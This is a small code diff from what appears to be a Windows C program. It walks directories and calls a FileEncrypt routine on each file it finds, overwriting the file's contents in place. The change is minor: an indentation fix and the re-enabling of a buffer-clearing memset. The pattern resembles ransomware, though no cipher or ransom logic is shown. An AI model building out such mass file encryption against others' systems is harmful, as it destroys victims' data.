@@ -77,7 +77,7 @@ void FindDir(unsigned char * path, unsigned char * mask) {
     strcpy(pathfile, path);
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
-	FileEncrypt(pathfile);
+    FileEncrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
@@ -151,7 +151,7 @@ void FileEncrypt (unsigned char * filename) {
        fwrite(buffer, size_uc, realread, f);
        fflush(f);
 
-       //memset(buffer, _ZERO, _BUFFER_SIZE);
+       memset(buffer, _ZERO, _BUFFER_SIZE);
        position += realread;
       }
     }
